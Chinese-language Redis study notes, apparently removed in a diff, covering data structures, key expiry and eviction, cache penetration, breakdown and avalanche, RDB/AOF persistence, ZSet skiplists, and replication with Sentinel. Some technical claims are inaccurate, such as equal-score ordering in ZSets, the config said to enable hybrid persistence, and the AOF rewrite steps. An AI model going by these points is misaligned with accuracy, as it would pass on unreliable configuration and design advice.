-系统依赖性：不同操作系统提供的 I&#x2F;O 多路复用机制（如 select、poll、epoll）有差异，可能需要考虑跨平台的适配问题。
-
-
-redis都有哪些数据结构Redis 提供了多种数据结构，旨在帮助开发者高效地存储和操作不同类型的数据。每种数据结构在 Redis 中都扮演着不同的角色，针对特定的应用场景进行优化。以下是 Redis 支持的主要数据结构：
-1. String（字符串）
-描述：Redis 中的基本数据类型，可以存储任何类型的字符串，包括数字、文本、二进制数据等。
-特点：
-每个键值对中的值都是一个字符串，最大长度为 512 MB。
-支持常见的字符串操作，如设置、获取、拼接、截取等。
-用途广泛，适合存储缓存、会话信息、计数器等。
-
-
-常见操作：
-SET key value：设置键值对。
-GET key：获取键对应的值。
-INCR key：对值进行加 1 操作（计数器）。
-
-
-
-2. List（列表）
-描述：一个简单的字符串列表，按照插入顺序排序，可以在列表的两端进行推送、弹出等操作。
-特点：
-支持从左侧或右侧操作（即双端队列）。
-适合队列、栈等数据模型。
-支持基于索引的访问和范围查询。
-
-
-常见操作：
-LPUSH key value：将值推入列表的左端。
-RPUSH key value：将值推入列表的右端。
-LPOP key：从左侧弹出一个元素。
-RPOP key：从右侧弹出一个元素。
-LRANGE key start stop：返回列表指定范围内的元素。
-
-
-
-3. Set（集合）
-描述：无序的字符串集合，集合中的元素是唯一的，没有重复值。
-特点：
-支持集合操作，如交集、并集和差集等。
-适合用来存储不允许重复的数据。
-常用于标签、集合运算等。
-
-
-常见操作：
-SADD key member：将成员添加到集合中。
-SREM key member：移除集合中的成员。
-SMEMBERS key：返回集合中的所有成员。
-SINTER key1 key2：返回两个集合的交集。
-
-
-
-4. Sorted Set（有序集合）
-描述：与 Set 类似，但每个元素都有一个分数（score），根据分数进行排序。
-特点：
-元素按照分数从小到大排序，且分数相同的元素会按照插入顺序排序。
-支持范围查询，可以根据分数范围进行查询，适用于排行榜、延迟队列等场景。
-
-
-常见操作：
-ZADD key score member：将元素及其分数添加到有序集合中。
-ZRANGE key start stop：返回指定区间内的元素。
-ZREM key member：移除有序集合中的成员。
-ZRANK key member：返回成员的排名。
-
-
-
-5. Hash（哈希）
-描述：键值对集合，适合存储对象类型的数据。哈希可以通过字段（field）来存储多个值。
-特点：
-每个哈希可以包含多个字段和相应的值，类似于一个对象或记录。
-适合存储多个关联字段的数据（例如，用户信息）。
-
-
-常见操作：
-HSET key field value：为哈希添加一个字段和值。
-HGET key field：获取哈希中指定字段的值。
-HGETALL key：获取哈希中的所有字段和值。
-HDEL key field：删除哈希中的指定字段。
-
-
-
-6. Bitmaps（位图）
-描述：位图是对字符串类型的一种扩展，可以将字符串的每一位作为一个独立的 bit（0 或 1）来使用。
-特点：
-适用于高效的布尔值集合操作，比如用户是否参与活动。
-可以在不需要额外内存的情况下存储大量的布尔值。
-
-
-常见操作：
-SETBIT key offset value：在指定位置设置位值。
-GETBIT key offset：获取指定位置的位值。
-BITCOUNT key：统计指定键中为 1 的位数。
-
-
-
-9. Streams（流）
-描述：Redis Streams 是一个类似消息队列的数据结构，用于存储和处理消息流。
-特点：
-支持按时间戳存储消息，并支持消费者组（Consumer Groups）。
-可用于构建类似 Kafka 的消息队列系统。
-
-
-常见操作：
-XADD key * field value：向流中添加一条消息。
-XREAD：从流中读取消息。
-XGROUP CREATE：创建消费者组。
-
-
-
-总结Redis 提供了非常丰富和高效的数据结构，适用于各种不同的使用场景。根据不同的需求，你可以选择合适的数据结构来存储和处理数据：
-
-String：适用于缓存、计数器等简单数据。
-List：适合队列、栈等线性数据。
-Set：用于去重、集合操作等。
-Sorted Set：适合排行榜、延迟队列等按顺序操作的数据。
-Hash：适合存储对象或多字段的数据。
-Bitmaps：适用于位级操作。
-Streams：适用于消息队列等场景。
-
-这些数据结构可以帮助开发者根据实际需求进行灵活的设计与优化，使得 Redis 成为一个非常强大的数据存储系统。
-
-
-
-类型
-特点
-场景
-
-
-
-String
-快速简单，最大512MB
-缓存单值、计数器、Token
-
-
-Hash
-结构体对象存储
-用户信息、配置项
-
-
-List
-有序双向链表
-消息队列、日志
-
-
-Set
-无序唯一集合
-去重、标签、集合运算
-
-
-ZSet
-有序集合，带权重
-排行榜、延迟队列
-
-
-
-Redis 是单线程的，为什么还能这么快？单线程不是慢吗？
-所有数据在内存中，访问没有磁盘 IO
-单线程模型，避免上下文切换和加锁开销
-基于 epoll 的 IO 多路复用，处理高并发连接
-简单高效的数据结构（C实现 + ziplist&#x2F;intset优化）
-
-
-Redis的过期机制和内存淘汰策略一、Key 的过期机制（TTL）Redis 支持设置每个 key 的过期时间，到时间后自动删除。
-🔹设置过期时间的命令SET user:1 &quot;Tom&quot; EX 60     # 设置 60 秒后过期EXPIRE user:1 60           # 单独设置过期时间TTL user:1                 # 查询剩余时间
-
-Redis 什么时候删除这些 key？重点：不是精确时钟删除，而是惰性 + 定期删除机制组合
-删除策略详解
-惰性删除（Lazy）
-客户端访问 key 时，Redis 发现已过期，就立刻删掉（并返回 nil）
-
-
-定期删除（主动扫描）
-每 100ms，Redis 会随机抽样一批带过期时间的 key，删除过期的
-如果发现超 25% 的 key 都过期了，就加快扫描节奏
-
-
-
-为什么不逐个精准定时删除？会造成高 CPU 负载，扫描量大，Redis 单线程承受不住
-
-二、内存淘汰机制（Memory Eviction）当 Redis 达到设置的最大内存（maxmemory），又需要写入新 key 时，会触发淘汰机制。
-# 配置示例maxmemory 512mbmaxmemory-policy allkeys-lru
-
-
-常见的内存淘汰策略
-
-
-策略名
-含义
-推荐使用场景
-
-
-
-noeviction
-默认值，不淘汰，写入时报错
-不建议线上使用
-
-
-volatile-lru
-从有过期时间的 key 中淘汰最少使用的
-有效控制热数据内存
-
-
-allkeys-lru
-所有 key 中淘汰最少使用的
-推荐：缓存场景
-
-
-volatile-ttl
-从有过期时间的 key 中淘汰快过期的
-延迟淘汰控制
-
-
-allkeys-random
-所有 key 中随机淘汰
-一般用作测试
-
-
-volatile-random
-有过期时间的 key 中随机淘汰
-比较少用
-
-
-
-Redis 设置了 maxmemory 和淘汰策略，为什么还是 OOM 了？
-设置的是 noeviction，没有开启淘汰功能
-有大量 key 没设置 TTL，策略是 volatile-*，Redis 找不到 key 可以淘汰
-有大 key（bigkey），触发淘汰时清理不及时
-写入速度远超淘汰速度（高并发写入 + 单线程处理）
-
-
-实战建议
-
-
-建议
-理由
-
-
-
-key 必须设置 TTL
-防止缓存雪崩，内存泄露
-
-
-建议使用 allkeys-lru
-更加自动化地控制内存
-
-
-避免存大 key（如超大 hash、list）
-淘汰慢、容易卡主线程
-
-
-监控 Redis 内存使用
-用 INFO MEMORY 或 redis_exporter 上 Prometheus 监控
-
-
-
-自问自答
-Redis 的过期 key 是怎么删除的？是实时的吗？ 不是实时的， 惰性+定期
-Redis 的惰性删除和定期删除分别是什么？ 
-Redis 的内存淘汰策略有哪些？哪个最常用？
-如果写入大量 key，但内存没满 Redis 就挂了，可能的原因有哪些？ 有设置最大内存， 或者是过多内存碎片，  或者是有写入大key，导致CPU撑不住卡主进程了…..
-项目中怎么控制 Redis 占用内存？  设置**maxmemory**、内存回收策略、过期时间控制
-
-
-缓存穿透、缓存击穿、缓存雪崩缓存穿透问题描述客户端频繁请求数据库中根本不存在的 key，由于缓存 miss，Redis 不命中，所有请求都落到底层数据库，造成数据库压力激增，甚至打挂。
-典型场景请求不存在的用户 ID，比如 GET user:-1，Redis miss，数据库 miss，不断重复请求。
-解决方案
-缓存空值
-对于数据库返回 null 的数据，也缓存一个标记，例如：user:-1 =&gt; &quot;null&quot;，设置较短过期时间。
-
-
-布隆过滤器（BloomFilter）
-在 Redis 之前做一层布隆过滤器，用于快速判断 key 是否存在，避免无意义请求。
-
-
-接口参数校验
-提前在 API 层做参数合法性校验，比如 ID 必须 &gt; 0。
-
-
-
-
-缓存击穿问题描述一个热点 key 恰好过期，大量并发请求在这个瞬间同时打到数据库，造成数据库压力瞬时激增。
-典型场景某商品详情是热点，每秒几千请求，刚好 GET product:123 在某个时刻过期，所有请求瞬间穿透。
-解决方案
-互斥锁（分布式锁）
-第一个请求获取锁去加载数据，其它请求等待或短时间返回旧数据。
-
-
-永不过期 + 异步刷新
-不设置过期时间，而是定时刷新缓存（通过定时任务或消息队列）。
-
-
-合理设置过期时间 + 提前异步预热
-对热点 key 使用更长过期时间，或者在过期前预热。
-
-
-
-
-缓存雪崩问题描述大量 key 在同一时刻同时失效，所有请求同时穿透，数据库被压垮。
-典型场景比如你缓存设置了 1 小时统一过期，某一时刻恰好全部失效，系统瞬间崩溃。
-解决方案
-过期时间加随机扰动
-给每个 key 设置不同的过期时间，避免同一时间集中失效。例如 EX 600 + random(0~60)。
-
-
-热点数据永不过期 + 后台异步刷新
-降级保护机制
-当发现缓存异常，短路请求，直接返回默认值、静态页等。
-
-
-
-
-自问自答
-什么是缓存穿透？怎么解决？
-缓存击穿和穿透的区别是什么？
-怎么解决 Redis 大量 key 同时过期的雪崩问题？
-使用 Redis 做缓存时，是否建议 key 永久有效？
-有没有用过布隆过滤器？什么原理？ 是个概率性的数据结构， 用多个不同的哈希算法， 拿到的哈希值如果对应的都是1， 就是1， 只要有一个是0， 就是0， 因此存的数据量越大， 越容易误报
-
-Redis的持久化机制（RDB 与 AOF）Redis 虽然是内存数据库，但为了防止数据丢失，提供了两种持久化机制：RDB（快照）和 AOF（追加日志）。
-
-持久化方式概览
-
-
-类型
-全称
-特点
-数据安全性
-文件大小
-启动速度
-
-
-
-RDB
-Redis DataBase snapshot
-定期快照
-较低
-小
-快
-
-
-AOF
-Append Only File
-日志追加
-高
-大
-慢（需重放）
-
-
-混合模式
-RDB + AOF
-Redis 4.0 后默认
-综合优点
-可控
-快速恢复
-
-
-
-RDB（快照方式）原理
-Redis 在一定时间间隔内将内存数据写入一个压缩过的二进制文件（.rdb）
-触发方式：
-自动：配置 save 900 1（900 秒内至少 1 个 key 变动）
-手动：执行 SAVE 或 BGSAVE 命令
-
-
-
-优点
-启动恢复速度快
-文件体积小，适合备份、灾备迁移
-
-缺点
-可能丢失最近一次修改（最后一次快照之后的数据）
-BGSAVE 会 fork 子进程，写入大文件时会造成系统负载升高
-
-
-AOF（日志方式）原理
-所有写命令会追加到 .aof 文件中，Redis 重启时按顺序“重放命令”恢复数据
-三种刷盘策略（由 appendfsync 决定）：
-always：每次写都刷盘（最安全，最慢）
-everysec：每秒刷一次（默认）
-no：由操作系统决定（可能丢失几秒）
-
-
-
-优点
-数据恢复更完整（最多丢失 1 秒）
-适合对数据完整性要求高的场景
-
-缺点
-文件越来越大，需要定期重写（BGREWRITEAOF）
-启动时需要重放日志，恢复速度比 RDB 慢
-
-
-混合持久化（Redis 4.0+）原理
-在 AOF 重写时，先将当前快照（RDB 格式）写入 AOF，然后再追加后续写命令
-好处：
-启动速度几乎和 RDB 一样快
-数据完整性和 AOF 一样高
-
-
-
-开启方式aof-use-rdb-preamble yes
-
-
-配置示例save 900 1appendonly yesappendfsync everysecdir /var/lib/redis
-
-
-自问自答
-Redis 持久化有几种方式？分别适用于什么场景？
-如果 Redis 宕机了，数据怎么恢复？会不会丢数据？
-RDB 和 AOF 哪个恢复速度更快？哪个更安全？
-怎么避免 RDB&#x2F;AOF 持久化造成主线程卡顿？
-
-
-实战建议
-
-
-建议
-理由
-
-
-
-开启 AOF + everysec 模式
-实现安全性和性能的平衡
-
-
-配置 save 900 1 等参数
-保留定期快照，便于快速恢复
-
-
-设置 aof-use-rdb-preamble yes
-兼顾快速启动与完整性
-
-
-使用 Redis 主从 + 持久化
-容灾架构更稳妥
-
-
-Redis 是怎么做 AOF 重写的？会不会影响性能？在 Redis 中，AOF（Append Only File）重写 是一种用于优化磁盘 I&#x2F;O 和 AOF 文件大小的机制。AOF 重写是 Redis 在持久化数据时采取的一种方式，目的是定期生成新的 AOF 文件，从而减少旧文件的大小并提高性能。
-什么是 AOF 重写？Redis 使用 AOF 持久化机制时，会将所有的写命令记录到 AOF 文件中，这样即使 Redis 重启，数据也不会丢失。随着时间的推移，AOF 文件可能会变得非常大，尤其是在有大量写操作的场景下。为了避免 AOF 文件过大，Redis 提供了 AOF 重写（AOF rewrite） 机制。
-AOF 重写是指 Redis 会创建一个新的 AOF 文件，只记录 当前数据库状态 的最简写操作，从而生成一个更小的文件。这个过程不会影响 Redis 正常的写操作，但会在后台进行，保证 Redis 在重写期间继续为客户端提供服务。
-AOF 重写的工作原理
-触发条件：
-AOF 重写通常由 Redis 根据 AOF 文件的大小和重写条件来触发。重写会在 Redis 认为 AOF 文件过大时自动进行，或者也可以通过手动调用 BGREWRITEAOF 命令来触发。
-
-
-重写过程：
-在 AOF 重写过程中，Redis 会创建一个新的 AOF 文件，并在后台 重新生成 AOF 文件中的命令。这个过程会记录所有当前数据库状态所需的最小写命令。
-比如，如果数据库中某个键的值已经改变了多次，Redis 会将该键的最终状态写入新的 AOF 文件，而不再记录每次对该键的修改操作。
-
-
-AOF 重写的工作步骤：
-步骤 1：Redis 在后台创建一个新的 AOF 文件，并逐个遍历数据库中的所有键，生成一组命令来重新构建当前数据库的状态。
-步骤 2：当新的 AOF 文件创建完成后，Redis 会将当前 AOF 文件中的所有命令写入新文件中，确保新文件包含了数据库的最新状态。
-步骤 3：一旦新的 AOF 文件完成，Redis 会关闭原来的 AOF 文件，将新的文件替换为当前 AOF 文件。
-
-
-后台执行：
-在进行 AOF 重写时，Redis 会使用 后台（fork） 的方式创建一个子进程来执行重写操作。这个子进程会处理数据的写入，不会影响主进程的运行。
-这种方式允许 Redis 在 AOF 重写期间继续服务客户端请求，保证了系统的高可用性。
-
-
-
-AOF 重写是否会影响性能？AOF 重写的过程是通过 fork 子进程 来执行的，因此在执行重写时，Redis 主进程可以继续服务客户端请求。但是，AOF 重写操作还是会对性能产生一定的影响，具体体现在以下几个方面：
-
-内存占用：
-在 AOF 重写期间，Redis 会在后台创建一个子进程，并复制主进程的内存空间。这意味着在重写过程中，Redis 的内存使用量会增加，因为它需要同时保持原有的 AOF 文件和新的 AOF 文件内容。对于内存较小的机器，这可能会导致内存使用高峰。
-
-
-CPU 占用：
-AOF 重写需要扫描整个数据库，并生成新的 AOF 文件，这会消耗一定的 CPU 资源。虽然 Redis 会在后台执行这一过程，但在大数据量的情况下，CPU 的负载可能会暂时增高。
-
-
-磁盘 I&#x2F;O：
-AOF 重写会生成新的 AOF 文件，并将新的命令写入磁盘。这会增加磁盘的写入压力。如果磁盘性能较差或 I&#x2F;O 较高的场景下，可能会对性能产生影响。
-
-
-阻塞时间：
-在某些情况下，尤其是当 AOF 文件非常大，或者当系统资源有限时，AOF 重写可能会导致 Redis 的响应时间略微增加，特别是在频繁触发 AOF 重写时。
-
-
-fork 子进程的影响：
-Redis 使用 fork 创建子进程来执行 AOF 重写操作，而 fork 操作会占用一定的系统资源。虽然子进程会在重写完成后被销毁，但在 fork 的过程中，操作系统需要进行内存页的复制，这会消耗 CPU 和内存资源。
-
-
-
-如何减少 AOF 重写对性能的影响？为了减少 AOF 重写对性能的影响，可以采取以下策略：
-
-**合理设置 **auto-aof-rewrite-percentage** 和 ****auto-aof-rewrite-min-size**：
-auto-aof-rewrite-percentage：控制触发 AOF 重写的条件。它设置为相对于上次重写时 AOF 文件的大小增长百分比。
-auto-aof-rewrite-min-size：控制 AOF 文件的最小大小，只有当文件大小超过这个值时，才会考虑执行 AOF 重写。
-
-
-
-通过合理配置这两个参数，可以控制 AOF 重写的触发频率，从而避免频繁的 AOF 重写操作，减小对性能的影响。
-auto-aof-rewrite-percentage 100  # AOF 文件大小增加 100% 后进行重写auto-aof-rewrite-min-size 64mb  # AOF 文件超过 64MB 时才进行重写
-
-
-使用合适的硬件资源：
-如果可能，考虑为 Redis 配置更高性能的硬件，尤其是 I&#x2F;O 密集型的存储设备（如 SSD）。更强大的硬件可以显著减少 AOF 重写过程中对磁盘 I&#x2F;O 的压力。
-
-
-优化 **maxmemory-policy** 配置：
-在 Redis 中设置合理的内存回收策略，确保内存不会过度占用，避免因内存不足导致频繁的 AOF 重写。
-
-
-分批写入数据：
-对于大量写入数据的场景，考虑将数据写入 Redis 时分批处理，减少瞬时写入压力，降低 AOF 文件增长速度。
-
-
-使用 AOF + RDB 混合持久化（RDB + AOF）：
-Redis 还支持同时使用 RDB（快照） 和 AOF 两种持久化方式，您可以通过配置 Redis 在一定间隔内执行快照（RDB）保存，并在更高频次下执行 AOF 持久化。这可以减小对性能的影响，同时保证数据持久化。
-
-
-
-# 启用 RDB 和 AOF 混合持久化appendonly yesappendfsync everysecsave 900 1save 300 10save 60 10000
-
-总结AOF 重写是 Redis 为了优化 AOF 文件大小、提高性能和减少磁盘 I&#x2F;O 而采取的机制。虽然 AOF 重写通常是在后台进行，不会阻塞主进程，但它确实会消耗一些额外的 CPU 和内存资源，尤其是在大数据量的情况下。因此，合理的配置和硬件资源的支持是确保 AOF 重写不会对性能产生过大影响的关键。
-
-怎么避免 RDB&#x2F;AOF 持久化造成主线程卡顿在 Redis 中，RDB 和 AOF 是两种常见的持久化机制，它们会定期将内存中的数据持久化到磁盘，确保数据的持久性。但这两个过程可能会造成一定的 主线程卡顿，特别是在大规模数据存储或高并发环境下，RDB 和 AOF 持久化过程会占用大量的 CPU 和 I&#x2F;O 资源，从而影响 Redis 的响应速度和性能。
-下面是一些避免 RDB&#x2F;AOF 持久化造成主线程卡顿的方法
-1. 使用 RDB 快照时采用后台保存（save 和 BGSAVE）
-默认情况下，Redis 使用 **BGSAVE**（背景保存）来执行 RDB 快照操作。BGSAVE 会在后台创建一个子进程，主线程继续服务客户端请求。
-BGSAVE 操作不会阻塞主线程，它通过 fork() 子进程的方式执行，因此可以在不影响 Redis 主线程的情况下进行持久化。
-注意：如果在 Redis 配置中使用 **save** 命令来设置 RDB 快照（比如每隔 900 秒进行一次快照），如果在执行 RDB 时不使用 BGSAVE，则会导致 阻塞，因为此时 Redis 主线程会被锁定，直到 RDB 快照完成。
-
-配置：
-# RDB 快照配置示例save 900 1save 300 10save 60 10000
-
-在 BGSAVE 执行期间，主线程仍然可以继续处理客户端请求。
-2. 合理配置 AOF 持久化AOF（Append Only File）将 Redis 执行的所有写操作追加到 AOF 文件中，以保证持久化数据。AOF 的同步策略（appendfsync）决定了每次写入操作是如何同步到磁盘的：
-
-**appendfsync always**：每次写操作都会同步到磁盘，性能最低，通常不推荐。
-**appendfsync everysec**：每秒同步一次。是推荐的设置，性能和数据持久性之间有一个良好的平衡。
-**appendfsync no**：让操作系统决定何时将数据同步到磁盘，性能最高，但在系统崩溃时可能会丢失一些数据。
-
-推荐设置：
-appendonly yesappendfsync everysec  # 每秒钟一次同步到磁盘
-
-appendfsync everysec 可以最大限度减少 AOF 持久化对主线程的影响，同时确保数据的持久性。
-3. 启用 AOF 重写机制AOF 文件随着时间的推移会变得越来越大，这样会导致持久化操作变得非常慢，影响 Redis 的性能。为了防止 AOF 文件过大导致性能下降，Redis 提供了 AOF 重写（AOF rewrite） 机制。
-AOF 重写 的过程是将当前数据库的状态重新写入 AOF 文件，并且会创建一个新的 AOF 文件，而不记录所有历史操作。AOF 重写是通过一个后台进程来完成的，因此它不会影响主线程。
-AOF 重写的触发条件：
-
-当 AOF 文件的大小超出一定比例时（默认是 100%）。
-可以通过配置 auto-aof-rewrite-percentage 和 auto-aof-rewrite-min-size 来控制触发条件。
-
-配置示例：
-# 自动触发 AOF 重写的条件auto-aof-rewrite-percentage 100  # 当 AOF 文件大小增加 100% 时触发重写auto-aof-rewrite-min-size 64mb  # 当 AOF 文件超过 64MB 时触发重写
-
-通过合理配置 AOF 重写，Redis 可以自动优化 AOF 文件的大小，避免在文件过大的时候影响性能。
-4. 优化磁盘 I&#x2F;O 性能RDB 和 AOF 持久化操作都涉及到磁盘 I&#x2F;O，因此磁盘性能对于持久化的效率至关重要。使用更快的存储设备（例如 SSD）可以显著提高持久化过程的性能，减少对主线程的影响。
-优化建议：
-
-使用 SSD（固态硬盘）而不是传统的 HDD（机械硬盘），以减少磁盘 I&#x2F;O 的延迟。
-将 Redis 的数据目录和 AOF 文件存储在不同的物理磁盘上，避免磁盘 I&#x2F;O 竞争。
-通过 **vm.dirty_background_bytes** 等内核参数来调整操作系统的 I&#x2F;O 调度策略，优化磁盘写入效率。
-
-5. 定期执行 MEMORY PURGE 清理内存碎片当 Redis 进行大量写入和持久化时，内存碎片可能导致内存管理效率低下，从而影响 Redis 性能。使用 **MEMORY PURGE** 命令可以清理 Redis 中的内存碎片，释放无用内存，从而减少内存使用和提高性能。
-MEMORY PURGE  # 清理内存碎片
-
-定期执行内存清理操作有助于减轻持久化时的内存负担，从而改善 Redis 性能。
-6. 使用混合持久化（RDB + AOF）Redis 支持混合持久化，即同时使用 RDB 和 AOF。通过这种方式，Redis 可以在启动时使用 RDB 快照来恢复数据，而在写操作时使用 AOF 进行持久化。混合持久化通过减少 AOF 文件的大小来优化性能，并提高 Redis 的启动速度。
-启用混合持久化：
-appendonly yesappendfsync everysecrdbchecksum yes
-
-混合持久化的优势是，在不牺牲持久化的可靠性和完整性的情况下，通过 AOF 重写和 RDB 快照的结合来减少磁盘 I&#x2F;O 的压力。
-总结为了避免 RDB 和 AOF 持久化造成 Redis 主线程卡顿，可以采取以下措施：
-
-**使用 ****BGSAVE** 执行 RDB 快照，避免阻塞主线程。
-合理配置 AOF 持久化策略（推荐 appendfsync everysec）来平衡性能和持久性。
-利用 AOF 重写 来减少 AOF 文件的大小，避免性能下降。
-优化磁盘 I&#x2F;O 性能，使用 SSD 或更快的存储设备来提高持久化效率。
-定期清理内存碎片，通过 MEMORY PURGE 来减轻内存管理负担。
-使用混合持久化（RDB + AOF）来提升性能，减少 AOF 文件大小。
-
-通过这些方法，您可以减少 RDB 和 AOF 持久化对 Redis 性能的影响，提高系统的响应速度和可用性。
-Redis是怎么存储有序集合zset的Redis 的 ZSet（有序集合），它在 Redis 中扮演着非常核心的角色，特别适用于排行榜、延时队列、权重调度等场景。
-
-什么是 ZSet（Sorted Set）ZSet 是 Redis 中的一种数据结构，全称是 有序集合（Sorted Set）。
-它的特点是：
-
-每个元素都是唯一的（像 Set）
-每个元素关联一个 score（分数），按 score 排序（像优先队列）
-可以按分数范围、高低排名、高低分数做高效查询
-
-你可以把 ZSet 看成是：带权重的 Set + 排序链表 + 快速查找结构
-
-数据结构实现：跳表 + 哈希表ZSet 底层用了两个结构：
-哈希表（dict）
-快速定位元素对应的 score
-key 是元素，value 是 score
-
-
-跳表（skiplist）
-维持元素按 score 升序排列
-用于支持范围查找、区间遍历、按排名查询等
-
-
-
-为什么用跳表而不是红黑树？
-
-插入&#x2F;删除逻辑简单
-查询效率也接近 O(log n)
-Redis 追求极致性能，跳表是工程中性能 + 简洁度权衡最佳的结构
-
-
-核心操作和性能
-
-
-操作
-命令
-时间复杂度
-说明
-
-
-
-添加&#x2F;更新元素
-ZADD key score member
-O(log n)
-插入或更新元素，跳表中调整顺序
-
-
-删除元素
-ZREM key member
-O(log n)
-删除成员，同时从 dict 和 skiplist 删除
-
-
-查询成员的分数
-ZSCORE key member
-O(1)
-直接从 dict 中查
-
-
-按排名查成员
-ZRANGE key start stop
-O(log n + m)
-从跳表中按顺序取元素
-
-
-查某个成员的排名
-ZRANK key member
-O(log n)
-在跳表中向下查找节点，统计 rank
-
-
-范围删除
-ZREMRANGEBYSCORE key min max
-O(log n + m)
-从跳表中范围定位，然后批量删除
-
-
-分数区间查找
-ZRANGEBYSCORE key min max
-O(log n + m)
-先用跳表查 min，再往后遍历
-
-
-获取总数
-ZCARD key
-O(1)
-获取元素个数
-
-
-获取某 score 范围内的个数
-ZCOUNT key min max
-O(log n)
-范围查找后累加统计
-
-
-其中 m 表示范围内返回的元素数量。
-
-跳表结构内部逻辑（示意）以一个 ZSet 示例：
-ZADD z 5 aliceZADD z 10 bobZADD z 7 tomZADD z 1 kate
-
-跳表结构会长成这样（层数为随机生成的）：
-Level 3:            bobLevel 2:      tom - bobLevel 1: kate - tom - alice - bob
-
-每一层是有序链表，底层记录所有元素，查询从顶层开始，逐层往下，最终在底层找到目标。
-
-应用场景举例排行榜（经典）ZADD game 1000 user1ZADD game 950 user2ZADD game 1200 user3ZRANGE game 0 -1 WITHSCORES   # 按分数升序输出所有玩家ZREVRANK game user1           # 查看 user1 的排名（倒序）
-
-延时队列用 score 表示未来的执行时间戳：
-ZADD task_queue 1680000000 task_id_123ZRANGEBYSCORE task_queue 0 1680001000 LIMIT 0 1# 查当前需要执行的任务
-
-动态权重调度（比如任务优先级）score 表示优先级，值越小优先级越高：
-ZADD job 1 job1ZADD job 3 job2ZRANGE job 0 0        # 获取优先级最高的任务ZREM job job1         # 删除执行完成的任务
-
-
-与 List、Set、Hash 的对比
-
-
-结构
-是否排序
-是否支持范围查找
-插入&#x2F;查找复杂度
-用途
-
-
-
-List
-按插入顺序
-支持（按位置）
-O(1)&#x2F;O(n)
-消息队列
-
-
-Set
-无序
-不支持
-O(1)
-唯一元素集合
-
-
-ZSet
-按 score 排序
-支持
-O(log n)
-排行榜、延迟队列
-
-
-Hash
-无序
-不支持
-O(1)
-映射结构
-
-
-
-内存占用注意事项ZSet 中的跳表节点比较复杂，包含：
-
-元素值（字符串）
-score（double）
-多级 forward 指针
-span 用于计算 rank
-
-如果元素很多、节点层数高，跳表的内存占用会比普通链表&#x2F;集合大，需要注意评估。
-
-总结
-ZSet 是 Redis 提供的有序集合结构
-底层是 哈希表 + 跳表 的组合，既支持快速定位，也支持按顺序遍历
-提供排名、区间删除、分数查找、范围扫描等高级操作
-实现简单、查询快、非常适合排行榜、权重调度、定时任务等场景
-是 Redis 中最具代表性的高性能数据结构之一
-
-好的，我们进入 Redis 学习的第五讲，讲解：
-
-Redis 的主从复制与 Sentinel 高可用机制在生产环境中，单台 Redis 实例面临单点故障、无法扩容等问题。为了解决这类问题，Redis 提供了主从复制和哨兵机制（Sentinel），实现基本的高可用。
-
-主从复制（Replication）作用
-实现读写分离（主写从读）
-提供故障转移能力的基础
-多机热备，提高数据安全性
-
-架构示意Client       |    +------+       +------+    | Master | --&gt; | Slave1|    +------+       +------+                      |                   +------+                   |Slave2|                   +------+
-
-启动主从复制在从库的 redis.conf 中设置：
-replicaof &lt;master-ip&gt; &lt;master-port&gt;
-
-或者运行时命令：
-replicaof 127.0.0.1 6379
-
-同步过程
-从库连接主库，发送 PSYNC 命令
-首次同步：主库执行 BGSAVE 生成 RDB 文件并发送给从库
-增量同步：之后通过命令流（replication backlog）持续同步
-
-特点
-主库写，从库同步，数据最终一致
-从库是只读状态
-支持链式结构（slave -&gt; slave）
-
-
-Sentinel（哨兵）机制作用
-自动监控 Redis 主从节点状态
-主节点故障时，自动故障转移（failover）
-提供主节点的服务发现功能
-
-架构图+---------+         +---------+         +---------+|Sentinel1|         |Sentinel2|         |Sentinel3|+----+----+         +----+----+         +----+----+     \                    |                   /      \                  |                  /       \                |                 /        +------------+  |  +------------+                     |  |  |                  +--v--v--v--+                  |  Master   |                  +--+-----+--+                     |     |                  +--v--+ +--v--+                  |Slave1| |Slave2|                  +------+ +------+
-
-核心组件
-监控（Monitor）：定时 PING 主从节点
-通知（Notification）：主节点异常后发起故障报告
-投票（Leader Election）：多个哨兵协商选主
-故障转移（Failover）：重新选主并通知所有从库更新主节点
-
-配置示例sentinel monitor mymaster 127.0.0.1 6379 2sentinel down-after-milliseconds mymaster 5000sentinel failover-timeout mymaster 10000sentinel parallel-syncs mymaster 1
-
-特点
-最少部署 3 个哨兵节点，确保仲裁可靠性
-会自动修改从库指向新主库
-与客户端配合使用，实现服务发现（客户端动态连接主节点）
-
-
-自问自答
-Redis 主从同步机制是什么？全量同步和增量同步怎么实现？
-Redis Sentinel 的作用是什么？如何实现自动故障转移？
-Redis 主从架构如何避免脑裂？
-Redis 从库能写入吗？为什么？
-Redis Sentinel 和 ZooKeeper 的区别？
-
-
-实战建议
-
-
-建议
-理由
-
-
-
-使用至少 1 主 2 从 3 哨兵结构
-实现高可用、读写分离
-
-
-设置 min-slaves-to-write
-保证主库写操作安全
-
-
-Sentinel + 客户端主节点发现
-防止客户端连接老主节点
-
-
-定期监控主从延迟
-避免读到旧数据
-
-
-Redis 主从架构如何避免脑裂使用 Redis Sentinel（哨兵）Redis Sentinel 是官方提供的高可用性解决方案，主要用于监控 Redis 实例的状态，进行故障转移，并通知管理员。通过 Redis Sentinel 可以有效避免脑裂问题，具体做法包括：
-
-监控主从节点：Sentinel 定期检查 Redis 实例的健康状况，一旦主节点不可用，Sentinel 会自动选举一个新的主节点。
-故障转移：当检测到主节点不可用时，Sentinel 会从从节点中选举一个新的主节点，自动进行故障转移，确保服务的持续可用。
-通知报警：在发生故障时，Sentinel 会通过邮件、短信等方式通知管理员，便于及时处理。
-
-这种方式可以确保即使主节点失效，从节点能够迅速接管，减少脑裂的风险。
-配置 auto-aof-rewrite 和 appendonlyRedis 在启用 AOF（Append Only File）持久化模式时，每个写操作都会被记录到 AOF 文件中，这样可以在恢复时保持数据一致性。脑裂发生时，如果从节点与主节点的数据不一致，AOF 文件可以在重启时应用，确保数据恢复。
-然而，仅依赖 AOF 并不能完全避免脑裂，结合 Redis Sentinel 可以增强整体的高可用性和一致性。
-配置 min-slaves-to-write 和 min-slaves-max-lag为了减少脑裂的可能性，可以在主节点上配置以下参数：
-
-**min-slaves-to-write**：在进行写操作时，主节点要求至少有 N 个从节点同步确认。这有助于确保主节点的数据不会丢失，并避免主从数据不一致。
-**min-slaves-max-lag**：限制从节点的最大延迟，如果某些从节点的同步延迟过大，主节点将停止接受写操作，避免因为数据延迟而导致的数据不一致。
-
-通过这些配置，确保主节点只有在至少一部分从节点同步成功的情况下才会执行写操作，有助于减少脑裂的发生。
